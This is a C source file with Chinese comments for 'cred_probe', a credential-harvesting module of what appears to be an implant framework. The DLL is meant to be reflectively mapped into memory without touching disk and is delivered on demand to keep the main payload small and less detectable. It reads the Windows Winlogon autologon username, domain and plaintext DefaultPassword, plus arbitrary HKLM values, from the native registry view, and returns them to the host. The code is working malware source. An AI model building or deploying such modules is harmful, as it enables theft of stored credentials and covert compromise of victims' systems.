/* cred_probe.c —— 示例内存模块：注册表凭据痕迹采集（v1.4.0 S4）
 *
 * 为什么选它做示例模块：
 *   - 它代表主载荷里最"重"的一类可选功能（凭据采集，见 implant/credentials_windows.go：
 *     带 crypto/aes + 注册表 + DPAPI，属于 !light 档）。把它搬成按需下发的模块后，
 *     主载荷不再需要为它付出体积与静态特征；
 *   - 读 Winlogon 下的 DefaultUserName / DefaultDomainName / DefaultPassword /
 *     AutoAdminLogon 是**真实的凭据痕迹**（自动登录会把口令留在注册表里），
 *     且只读、无副作用，适合做端到端验证；
 *   - 顺便覆盖 ABI 的三个通道：会话 id（ctx.session_id_*）、参数（ctx.args_json）、
 *     输出（ctx.out_buf/out_len），以及 token 摘要（ctx.token_fnv，审计关联用）。
 *
 * 构建方式（见 internal/server/builder/module.go）：
 *   gcc -shared -O2 -s -nostdlib -Wl,--entry=tsh_module_entry -Wl,--kill-at \
 *       -o cred_probe.dll cred_probe.c -lkernel32 -ladvapi32
 *
 * 为什么用 -nostdlib：宿主是**反射式映射**这个 PE（不落盘、不走 LoadLibrary），
 * 不会执行 CRT 的初始化（TLS 回调 / __declspec(thread) / 全局构造）。带 CRT 的
 * 模块在良基址下也许能跑，但那是"碰运气"。这里干脆不带 CRT：不需要 msvcrt、
 * 没有 TLS 目录、不需要任何初始化，映射完就能用。
 *
 * 参数约定（ctx->args_json，UTF-8，可为空）：
 *   空                     → 读下面四个默认值
 *   reg:<子键>|<值名>      → 读 HKLM\<子键> 下的指定值
 * 说明：这里刻意不解析 JSON —— 免 CRT 的模块里塞一个 JSON 解析器得不偿失；
 * args_json 由宿主原样透传，模块自行解释，ABI 层不做任何假设。
 */

#include "tsh_module.h"

/* ─── 最小 Win32 声明（不引 windows.h：它会带进一批依赖 CRT 的内联函数）─── */
typedef unsigned long DWORD;
typedef unsigned long long ULONGLONG;
typedef void *HKEY;
typedef unsigned char BYTE;

#define HKEY_LOCAL_MACHINE ((HKEY)0x80000002UL)
#define KEY_READ 0x20019u
/* KEY_WOW64_64KEY：宿主载荷是 windows/386（32 位），而 Winlogon 这些键在 64 位系统上
 * 有独立的 32 位视图（实测：32 位视图里 DefaultUserName 是空串、AutoAdminLogon 缺失，
 * 原生视图里才有真值）。凭据痕迹采集当然要读**原生视图**，否则采到的是假象。
 * 32 位 Windows 上该标志可能不被接受，所以调用处做了"失败即回退普通 KEY_READ"。 */
#define KEY_WOW64_64KEY 0x0100u
#define KEY_READ_NATIVE (KEY_READ | KEY_WOW64_64KEY)
#define REG_SZ_ 1u
#define REG_EXPAND_SZ_ 2u
#define ERROR_SUCCESS_ 0u
#define ERROR_MORE_DATA_ 234u
#define COMPUTERNAME_MAX 64u

__declspec(dllimport) DWORD __stdcall GetComputerNameA(char *buf, DWORD *size);

__declspec(dllimport) DWORD __stdcall RegOpenKeyExA(HKEY key, const char *sub, DWORD opt,
                                                    DWORD sam, HKEY *out);
__declspec(dllimport) DWORD __stdcall RegQueryValueExA(HKEY key, const char *name, DWORD *reserved,
                                                       DWORD *type, BYTE *data, DWORD *size);
__declspec(dllimport) DWORD __stdcall RegCloseKey(HKEY key);

/* 免 CRT 时 gcc 有时会为结构体拷贝/清零生成 memcpy/memset 调用：自带实现兜底，
 * 否则链接期会报 undefined reference（比运行期崩溃好，但没必要踩）。 */
void *memcpy(void *d, const void *s, unsigned int n);

void *memcpy(void *d, const void *s, unsigned int n) {
    BYTE *dp = (BYTE *)d;
    const BYTE *sp = (const BYTE *)s;
    unsigned int i;
    for (i = 0; i < n; i++) {
        dp[i] = sp[i];
    }
    return d;
}

void *memset(void *d, int c, unsigned int n);

void *memset(void *d, int c, unsigned int n) {
    BYTE *dp = (BYTE *)d;
    unsigned int i;
    for (i = 0; i < n; i++) {
        dp[i] = (BYTE)c;
    }
    return d;
}

/* ─── 输出缓冲（写入宿主给的 out_buf，越界即置 overflow）────────────────── */

typedef struct {
    tsh_module_ctx *ctx;
    uint32_t n;
    int overflow;
} out_t;

static void out_init(out_t *o, tsh_module_ctx *ctx) {
    o->ctx = ctx;
    o->n = 0;
    o->overflow = 0;
    if (ctx != 0 && ctx->out_buf != 0 && ctx->out_cap > 0) {
        ctx->out_buf[0] = 0;
        ctx->out_len = 0;
    }
}

static void out_raw(out_t *o, const char *s, uint32_t n) {
    uint32_t i;
    if (o->overflow || o->ctx == 0 || o->ctx->out_buf == 0) {
        return;
    }
    if (o->n + n + 1u > o->ctx->out_cap) {
        o->overflow = 1; /* 缓冲区不足：宿主会看到 TSH_MOD_ERR_OUTPUT */
        return;
    }
    for (i = 0; i < n; i++) {
        o->ctx->out_buf[o->n + i] = s[i];
    }
    o->n += n;
    o->ctx->out_buf[o->n] = 0;
    o->ctx->out_len = o->n;
}

static uint32_t cstr_len(const char *s) {
    uint32_t n = 0;
    if (s == 0) {
        return 0;
    }
    while (s[n] != 0 && n < 4096u) {
        n++;
    }
    return n;
}

static void out_cstr(out_t *o, const char *s) { out_raw(o, s, cstr_len(s)); }

static void out_hex32(out_t *o, uint32_t v) {
    static const char *hex = "0123456789abcdef";
    char buf[9];
    int i;
    for (i = 0; i < 8; i++) {
        buf[i] = hex[(v >> ((7 - i) * 4)) & 0xF];
    }
    buf[8] = 0;
    out_raw(o, buf, 8);
}

static void out_u32(out_t *o, uint32_t v) {
    char buf[12];
    int i = 0;
    if (v == 0) {
        out_raw(o, "0", 1);
        return;
    }
    while (v > 0 && i < 11) {
        buf[i++] = (char)('0' + (v % 10u));
        v /= 10u;
    }
    /* 反转 */
    {
        int a = 0, b = i - 1;
        while (a < b) {
            char t = buf[a];
            buf[a] = buf[b];
            buf[b] = t;
            a++;
            b--;
        }
    }
    out_raw(o, buf, (uint32_t)i);
}

/* 追加 "key=" 前缀（key 为编译期字面量） */
static void out_kv(out_t *o, const char *key) {
    out_cstr(o, key);
    out_raw(o, "=", 1);
}

static void out_line(out_t *o, const char *key, const char *val) {
    out_kv(o, key);
    if (val != 0 && val[0] != 0) {
        out_cstr(o, val);
    } else {
        out_raw(o, "(absent)", 8);
    }
    out_raw(o, "\n", 1);
}

/* ─── 注册表读取（原始字节 → 文本，非字符串类型只报长度）────────────────── */

/* 把注册表值写进 out：value=数据 或 value=(absent) */
static void out_reg_value(out_t *o, const char *key, HKEY root, const char *sub, const char *name) {
    HKEY h = 0;
    DWORD type = 0;
    DWORD size = 0;
    BYTE data[512];
    DWORD rc;

    rc = RegOpenKeyExA(root, sub, 0, KEY_READ_NATIVE, &h);
    if (rc != ERROR_SUCCESS_ || h == 0) {
        /* 32 位 Windows / 不支持的平台：回退普通 KEY_READ（不静默失败，也绝不假装成功） */
        rc = RegOpenKeyExA(root, sub, 0, KEY_READ, &h);
    }
    if (rc != ERROR_SUCCESS_ || h == 0) {
        out_kv(o, key);
        out_raw(o, "(open-failed:", 13);
        out_u32(o, rc);
        out_raw(o, ")\n", 2);
        return;
    }
    type = 0;
    size = (DWORD)sizeof(data) - 1u;
    rc = RegQueryValueExA(h, name, 0, &type, data, &size);
    if (rc == ERROR_SUCCESS_ && (type == REG_SZ_ || type == REG_EXPAND_SZ_)) {
        data[size < sizeof(data) ? size : sizeof(data) - 1u] = 0;
        out_line(o, key, (const char *)data);
    } else if (rc == ERROR_SUCCESS_) {
        out_kv(o, key);
        out_raw(o, "(type=", 6);
        out_u32(o, type);
        out_raw(o, " size=", 6);
        out_u32(o, size);
        out_raw(o, ")\n", 2);
    } else {
        out_kv(o, key);
        out_raw(o, "(absent:", 8);
        out_u32(o, rc);
        out_raw(o, ")\n", 2);
    }
    RegCloseKey(h);
}

/* ─── 参数解析：reg:<子键>|<值名> ────────────────────────────────────────── */

/* 返回 1 表示命中并已填充 sub/value（均为指向 args 内部的 NUL 结尾片段） */
static int parse_reg_arg(const char *args, uint32_t len, const char **sub, const char **value) {
    static char subBuf[384];
    static char valBuf[128];
    uint32_t i;
    uint32_t split = 0;

    if (args == 0 || len < 5u) {
        return 0;
    }
    if (!(args[0] == 'r' && args[1] == 'e' && args[2] == 'g' && args[3] == ':')) {
        return 0;
    }
    for (i = 4; i < len && i < 4u + 383u; i++) {
        if (args[i] == '|') {
            split = i;
            break;
        }
    }
    if (split == 0) {
        return 0;
    }
    {
        uint32_t n = split - 4u;
        uint32_t j;
        for (j = 0; j < n; j++) {
            subBuf[j] = args[4u + j];
        }
        subBuf[n] = 0;
    }
    {
        uint32_t n = 0;
        uint32_t j = split + 1u;
        while (j < len && n < 127u) {
            valBuf[n++] = args[j++];
        }
        valBuf[n] = 0;
    }
    *sub = subBuf;
    *value = valBuf;
    return 1;
}

/* ─── ABI 导出 ──────────────────────────────────────────────────────────── */

/* 注意：386 上是 __stdcall（被调方清栈）—— 宿主用 Go 的 syscall.SyscallN 调用，
 * 它不替被调方清栈，因此导出函数的调用约定必须与 Win32 API 一致（stdcall）。
 * amd64 只有一种约定，__stdcall 被忽略。构建时用 -Wl,--kill-at 剥掉 @N 修饰，
 * 否则导出名会变成 tsh_module_main@4 而宿主按名字查不到。 */
__declspec(dllexport) uint32_t __stdcall tsh_module_abi(void) {
    return TSH_MODULE_ABI_VERSION;
}

__declspec(dllexport) const char *__stdcall tsh_module_name(void) {
    return "cred_probe";
}

/* 静态错误串：避免在上下文里塞分配器（模块没有堆） */
static char g_err[160];

__declspec(dllexport) const char *__stdcall tsh_module_error(void) {
    return g_err;
}

static void set_err(const char *msg) {
    uint32_t n = cstr_len(msg);
    uint32_t i;
    if (n > sizeof(g_err) - 1u) {
        n = (uint32_t)sizeof(g_err) - 1u;
    }
    for (i = 0; i < n; i++) {
        g_err[i] = msg[i];
    }
    g_err[n] = 0;
}

static const char kWinlogonSub[] = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon";

__declspec(dllexport) int32_t __stdcall tsh_module_main(tsh_module_ctx *ctx) {
    out_t o;
    char host[COMPUTERNAME_MAX + 1];
    DWORD hostLen = COMPUTERNAME_MAX;
    const char *sub = kWinlogonSub;
    const char *value = "DefaultUserName";
    int custom = 0;

    if (ctx == 0) {
        return TSH_MOD_ERR_HOST;
    }
    /* 布局漂移自检：宿主与模块各自编译时的结构体大小必须一致。 */
    if (ctx->struct_size != (uint32_t)sizeof(tsh_module_ctx)) {
        set_err("ctx struct_size mismatch");
        return TSH_MOD_ERR_ABI;
    }
    if (ctx->abi_version != TSH_MODULE_ABI_VERSION) {
        set_err("ctx abi_version mismatch");
        return TSH_MOD_ERR_ABI;
    }

    g_err[0] = 0;
    out_init(&o, ctx);

    /* 1) 回显 ABI 三要素：会话 id / 参数 / token 摘要 —— 端到端验证"宿主真的把
     *    上下文传进来了"，而不是模块自己在猜。 */
    out_line(&o, "module", "cred_probe");
    out_kv(&o, "abi");
    out_u32(&o, TSH_MODULE_ABI_VERSION);
    out_raw(&o, "\n", 1);
    out_kv(&o, "session_id");
    out_hex32(&o, ctx->session_id_hi);
    out_hex32(&o, ctx->session_id_lo);
    out_raw(&o, "\n", 1);
    out_kv(&o, "token_fnv");
    out_hex32(&o, ctx->token_fnv);
    out_raw(&o, "\n", 1);
    out_kv(&o, "args_json");
    if (ctx->args_json != 0 && ctx->args_len > 0) {
        out_raw(&o, ctx->args_json, ctx->args_len);
    } else {
        out_raw(&o, "(empty)", 7);
    }
    out_raw(&o, "\n", 1);

    host[0] = 0;
    if (GetComputerNameA(host, &hostLen) == 0) {
        host[0] = 0;
    }
    out_line(&o, "host", host);

    /* 2) 参数路径：reg:<子键>|<值名> */
    if (parse_reg_arg(ctx->args_json, ctx->args_len, &sub, &value)) {
        custom = 1;
    }
    if (custom) {
        out_reg_value(&o, "reg.value", HKEY_LOCAL_MACHINE, sub, value);
    } else {
        out_reg_value(&o, "winlogon.DefaultUserName", HKEY_LOCAL_MACHINE, sub, "DefaultUserName");
        out_reg_value(&o, "winlogon.DefaultDomainName", HKEY_LOCAL_MACHINE, sub, "DefaultDomainName");
        out_reg_value(&o, "winlogon.DefaultPassword", HKEY_LOCAL_MACHINE, sub, "DefaultPassword");
        out_reg_value(&o, "winlogon.AutoAdminLogon", HKEY_LOCAL_MACHINE, sub, "AutoAdminLogon");
    }
    out_cstr(&o, "status=ok\n");

    if (o.overflow) {
        set_err("output buffer too small");
        return TSH_MOD_ERR_OUTPUT;
    }
    return TSH_MOD_OK;
}

/* 模块入口点（PE AddressOfEntryPoint）：宿主反射映射后会按 DllMain 约定调用
 * (base, DLL_PROCESS_ATTACH=1, 0)。这里没有任何需要初始化的东西 —— 这正是
 * 选 -nostdlib 的目的：省掉 CRT 初始化对 loader/TLS 的依赖。 */
__declspec(dllexport) int __stdcall tsh_module_entry(void *hinst, uint32_t reason, void *reserved) {
    (void)hinst;
    (void)reason;
    (void)reserved;
    return 1; /* TRUE */
}
